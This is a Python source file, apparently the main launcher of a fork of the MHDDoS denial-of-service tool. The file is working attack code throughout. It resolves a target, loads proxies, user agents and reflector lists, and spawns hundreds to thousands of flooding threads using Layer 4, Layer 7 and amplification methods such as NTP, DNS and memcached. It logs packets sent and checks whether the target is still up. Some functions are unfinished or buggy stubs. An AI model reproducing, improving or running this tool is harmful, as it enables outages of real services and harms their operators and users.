import logging
import os
import sys
from contextlib import suppress
from json import load
from logging import basicConfig, getLogger, shutdown
from pathlib import Path
from socket import (gethostbyname)
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time, perf_counter
from typing import List, Union

import psutil
from PyRoxy import Tools as ProxyTools, ProxyType
from icmplib import Host
from requests import Response
from yarl import URL

from MHDDoS.methods.layer_4 import Layer4
from MHDDoS.methods.layer_7 import Layer7
from MHDDoS.methods.methods import Methods
from MHDDoS.methods.tools import Tools
from MHDDoS.utils.config_files import read_configuration_file_lines, read_configuration_file_text
from MHDDoS.utils.console_utils import clear_lines_from_console
from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
from MHDDoS.utils.logs import craft_outreach_log_message
from MHDDoS.utils.misc import Counter
from MHDDoS.utils.proxies import ProxyManager, load_proxies
from MHDDoS.utils.targets import Target

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

__version__: str = "2.3 SNAPSHOT"
__dir__: Path = Path(__file__).parent
bombardier_path: str = ""


def exit(*message):
    if message:
        logger.error(" ".join(message))
    shutdown()
    _exit(1)


UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time


def attack(
    attack_method: str,  # TODO: add option to use multiple attack methods
    target: Target,
    proxy_type: ProxyType = ProxyType.SOCKS5,
    proxies_file_path: str | None = "proxies/socks5.txt",
    user_agents_file_path: str | None = "user_agents.txt",
    referrers_file_path: str | None = "referrers.txt",
    reflectors_file_path: str | None = None
):
    # LOAD CONFIG FILES
    user_agents = read_configuration_file_lines(user_agents_file_path) if user_agents_file_path is not None else []
    referrers = read_configuration_file_lines(referrers_file_path) if referrers_file_path is not None else []
    proxies = load_proxies(proxies_file_path, proxy_type) if proxies_file_path is not None else []
    reflectors = None

    # SANITY CHECKS
    # check attack method
    if attack_method not in Methods.ALL_METHODS:
        exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
    # check target
    if not target.is_valid():
        exit(f"Provided target ('{target}') does not have a valid IPv4 (or it could not be resolved). Please provide a valid target next time.")

    # HANDLE BOMBARDIER
    if attack_method == "BOMB":
        raise NotImplemented("'BOMB' method support is not implemented yet.")
        # TODO: (maybe) add support for BOMBARDIER
        global bombardier_path
        bombardier_path = Path(__dir__ / "go/bin/bombardier")
        assert (
                bombardier_path.exists()
                or bombardier_path.with_suffix('.exe').exists()
        ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-attack_method"

    # INITIALIZE COUNTERS
    PACKETS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_PACKETS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()

    if attack_method in Methods.LAYER7_METHODS:
        pass

        # TODO: no need no more - this is handled by class Target
        # # HANDLE PARAMETERS
        # url = URL(target_address)
        # host = url.host
        # try:
        #     host = gethostbyname(url.host)
        # except Exception as e:
        #     exit('Cannot resolve hostname ', url.host, e)
        # ip = Tools.get_ip(target_address)
        # # print(f"IP: {ip}")
        # # print(f"Port: {url.port}")

        # TODO: no need no more in worrying about threads count
        # threads = int(argv[4])
        # rpc = int(argv[6])
        # timer = int(argv[7])

        # TODO: no need no more - we are logging to a file all the time
        # if len(argv) == 9:
        #     logger.setLevel("DEBUG")

        # TODO: no need no more in worrying about threads count
        # if threads > 1000:
        #     logger.warning("Number of threads is higher than 1000")
        # if rpc > 100:
        #     logger.warning("RPC (Requests Per Connection) number is higher than 100")

        # TODO: manage threads actively
        # for _ in range(threads):
        #     Layer7(url, host, attack_method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()

    if attack_method in Methods.LAYER4_METHODS:
        # TODO: no need no more - this is handled by class Target
        # # HANDLE PARAMETERS
        # url = URL(target_address)
        # port = url.port
        # host = url.host
        #
        # try:
        #     host = gethostbyname(host)
        # except Exception as e:
        #     exit('Cannot resolve hostname ', url.host, e)
        #
        # if port > 65535 or port < 1:
        #     exit("Invalid Port [Min: 1 / Max: 65535] ")

        # RAW SOCKET SUPPORT
        if attack_method in Methods.WHICH_REQUIRE_RAW_SOCKETS and not Tools.checkRawSocket():
            exit(f"Attack method {attack_method} requires a creation of raw socket, but it could not be created on this machine.")

        # threads = int(argv[3])
        # timer = int(argv[4])
        # proxies = None
        # referrers = None
        # if not port:
        #     logger.warning("Port Not Selected, Set To Default: 80")
        #     port = 80

        # REFLECTORS
        if reflectors_file_path is not None and attack_method in Methods.WHICH_SUPPORT_REFLECTORS:
            if not reflectors_file_path:
                exit(f"The reflector file path is not provided.\n{attack_method} attack method requires a reflector file.")

            reflectors_text = read_configuration_file_text(reflectors_file_path)
            if reflectors_text is None:
                exit(f"The reflector file doesn't exist: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

            reflectors = set(a.strip() for a in ProxyTools.Patterns.IP.findall(reflectors_text))
            if not reflectors:
                exit(f"Did not find any reflectors in the provided file: {reflectors_file_path}.\n{attack_method} attack method requires a reflector file.")

        # PROXIES WARNING
        if proxies is not None and len(proxies) > 0:
            if attack_method not in Methods.WHICH_SUPPORT_PROXIES:
                logger.warning(f"{attack_method} attack method does not support proxies. {attack_method} attack connections will happen from your IP.")

        # TODO: manage threads actively
        # for _ in range(threads):
        #     Layer4((host, port), referrers, attack_method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
    
    # TODO: input parameters
    # TODO: launch a lot of threads according to the given methods

    # PREPARE FOR THREAD MANAGEMENT
    INITIAL_THREADS_COUNT = 100
    THREADS_MAX_LIMIT = 4000
    THREADS_MIN_LIMIT = 1
    THREADS_STEP = 100
    thread_stop_events: List[Event] = []

    def start_new_attack_thread():
        stop_event = Event()
        stop_event.clear()

        # TODO: select random attack method from the list (when there will be multiple)
        selected_attack_method = attack_method

        if selected_attack_method in Methods.LAYER7_METHODS:
            Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, proxies, BYTES_SENT, PACKETS_SENT).start()
        elif selected_attack_method in Methods.LAYER4_METHODS:
            selected_proxies = proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
            Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, BYTES_SENT, PACKETS_SENT).start()

        thread_stop_events.append(stop_event)
        stop_event.set()

    def stop_attack_thread():
        if len(thread_stop_events) == 0:
            return

        thread_to_stop_event = thread_stop_events.pop()
        thread_to_stop_event.clear()

    def running_threads_count() -> int:
        return len(thread_stop_events)

    def step_up():
        for _ in range(THREADS_STEP):
            if running_threads_count() >= THREADS_MAX_LIMIT:
                break
            start_new_attack_thread()

    def step_down():
        for _ in range(THREADS_STEP):
            if running_threads_count() <= THREADS_MIN_LIMIT:
                break
            start_new_attack_thread()

    # LOWER PROCESS PRIORITY
    process = psutil.Process(os.getpid())
    if os.name == 'nt':
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    else:
        process.nice(19)

    # ATTACK
    logger.info(f"Starting attack at {target.ip}:{target.port} using {attack_method} attack method.")
    for _ in range(INITIAL_THREADS_COUNT):
        start_new_attack_thread()

    global last_counters_update_time
    last_counters_update_time = time()

    while True:
        # TODO:
        #       - check CPU utilization
        #       - decrease/increase threads
        # step_up()
        #       - push attack status into the queue

        # update counters
        pps, tp, bps, tb = update_counters(PACKETS_SENT, TOTAL_PACKETS_SENT, BYTES_SENT, TOTAL_BYTES_SENT)

        sleep(1)
        logger.info(f"Total bytes sent: {tb}, total requests: {tp}, BPS: {bps}/s, PPS: {pps} p/s, active threads: {len(thread_stop_events)}")
        # stop_attack_thread()


last_counters_update_time = 0


def update_counters(rolling_packets_counter: Counter,
                    total_packets_counter: Counter,
                    rolling_bytes_counter: Counter,
                    total_bytes_counter: Counter) -> (str, str, str, str):
    global last_counters_update_time
    time_since_last_update = time() - last_counters_update_time

    # update total request counts
    total_packets_counter += int(rolling_packets_counter)
    rolling_packets_counter.set(0)
    total_bytes_counter += int(rolling_bytes_counter)
    rolling_bytes_counter.set(0)
    last_counters_update_time = time()

    # return current stats
    pps = Tools.humanformat(int(int(rolling_packets_counter) / time_since_last_update))
    bps = Tools.humanbytes(int(int(rolling_bytes_counter) / time_since_last_update))
    tp = Tools.humanformat(int(total_packets_counter))
    tb = Tools.humanbytes(int(total_bytes_counter))

    return pps, tp, bps, tb


def start():
    # COUNTERS
    REQUESTS_SENT = Counter()
    BYTES_SENT = Counter()
    TOTAL_REQUESTS_SENT = Counter()
    TOTAL_BYTES_SENT = Counter()

    with open(__dir__ / "config.json") as f:
        config = load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                Tools.runConsole()
            if one == "STOP":
                Tools.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = Tools.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:

                # HANDLE PARAMETERS
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = Tools.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])

                # HANDLE PROXIES
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)

                proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                proxies = ProxyManager.validateProxyList(proxies, ip, int(url.port), method, urlraw)

                # HANDLE BOMBARDIER
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")
                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                # HANDLE USERAGENTS
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                if not uagents: exit("Empty Useragent File ")

                # HANDLE REFERRERS
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                # TODO: manage threads actively
                for _ in range(threads):
                    Layer7(url, host, method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()

            if method in Methods.LAYER4_METHODS:
                # HANDLE PARAMETERS
                url = URL(urlraw)
                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not Tools.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = ProxyManager.loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = ProxyManager.validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = Tools.get_ip(urlraw)
            ip = host
            health_check_thread = Thread(
                daemon=True,
                target=target_health_check_loop,
                args=(HEALTH_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            )
            health_check_thread.start()

            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time()

            while time() < ts + timer:
                # log_attack_status()

                # update request counts
                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                TOTAL_BYTES_SENT += int(BYTES_SENT)
                REQUESTS_SENT.set(0)
                BYTES_SENT.set(0)

                # craft the status log message
                pps = Tools.humanformat(int(REQUESTS_SENT))
                bps = Tools.humanbytes(int(BYTES_SENT))
                tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
                tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
                logger.info(f"Total bytes sent: {tb}, total requests: {tp}")

                sleep(1)

            event.clear()
            exit()

        Tools.usage()


last_target_health_check_timestamp: float = 0
"""Time when the last target health check was started."""

HEALTH_CHECK_INTERVAL = 10
is_first_health_check_done: bool = False
last_l4_result: Host = None
last_l7_response: Union[Response, None] = None
last_l4_proxied_results: List[Host] = None
last_l7_proxied_responses: List[Union[Response, None]] = None


def target_health_check_loop(interval: float,
                             ip: str,
                             port: int,
                             method: str,
                             url: Union[str, None],
                             proxies: Union[set, None]):
    global is_first_health_check_done, last_l4_result, last_l7_response, \
        last_l4_proxied_results, last_l7_proxied_responses, last_target_health_check_timestamp

    while True:
        start_timestamp = perf_counter()

        last_l4_result, \
        last_l7_response, \
        last_l4_proxied_results, \
        last_l7_proxied_responses = TargetHealthCheckUtils.health_check(ip, port, method, url, proxies,
                                                                        layer_4_retries=1,
                                                                        layer_4_timeout=2,
                                                                        layer_4_interval=0.2,
                                                                        layer_7_timeout=10)

        last_target_health_check_timestamp = time()
        is_first_health_check_done = True

        while perf_counter() - start_timestamp < interval:
            sleep(0.1)


status_logging_started = False


def log_attack_status_new():
    global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started

    # craft status message
    message = "\n"
    message += craft_performance_log_message()
    message += craft_outreach_log_message(
        is_first_health_check_done,
        last_target_health_check_timestamp,
        last_l4_result,
        last_l4_proxied_results,
        last_l7_response,
        last_l7_proxied_responses
    )

    # log the message
    if not status_logging_started:
        status_logging_started = True
    else:
        message_line_count = message.count("\n") + 1
        clear_lines_from_console(message_line_count)
        # pass
    print(message, end="")


def craft_performance_log_message():
    # craft the status log message
    pps = Tools.humanformat(int(REQUESTS_SENT))
    bps = Tools.humanbytes(int(BYTES_SENT))
    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
    status_string = f"Status:\n" \
                    f"    Outgoing data:\n" \
                    f"       Per second:\n" \
                    f"          Packets/s: {pps}\n" \
                    f"          Bytes/s:   {bps}\n" \
                    f"       Total since the attack started:\n" \
                    f"          Packets sent: {tp}\n" \
                    f"          Bytes sent:   {tb}\n"

    return status_string


if __name__ == '__main__':
    start()
